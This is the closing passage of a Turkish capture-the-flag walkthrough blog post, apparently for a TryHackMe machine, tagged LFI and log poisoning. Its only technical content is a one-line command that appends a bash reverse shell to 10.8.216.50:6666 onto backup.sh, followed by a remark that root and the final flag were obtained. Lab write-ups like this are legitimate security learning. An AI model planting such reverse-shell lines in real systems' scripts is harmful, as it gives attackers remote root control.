<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/10.8.216.50/6666 0&gt;&amp;1&quot; &gt;&gt; backup.sh</span><br></pre></td></tr></table></figure>

<p>Mutlu son. Root yetkisi ile shell aldık. Son flag de burada.</p>
	  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2022/02/23/THM-Plotted-TMS-Cozum/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> önceki yazı</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Ana menü</a>
    
    <a href="/2022/02/01/DNS-Nedir-Nasil-Calisir/" type="button" class="btn btn-default ">sonraki yazı<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-02-16 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/CTF-Cozum/">CTF Çözüm<span>5</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Linux/">Linux<span>2</span></a></li> <li><a href="/tags/LFI/">LFI<span>1</span></a></li> <li><a href="/tags/Log-Poisoning/">Log Poisoning<span>1</span></a></li> <li><a href="/tags/Php-filters/">Php filters<span>1</span></a></li> <li><a href="/tags/Docker/">Docker<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>
		

</div><!-- row -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
I'm gonna be on television.
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎YUKARI</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>


</body>
   </html>
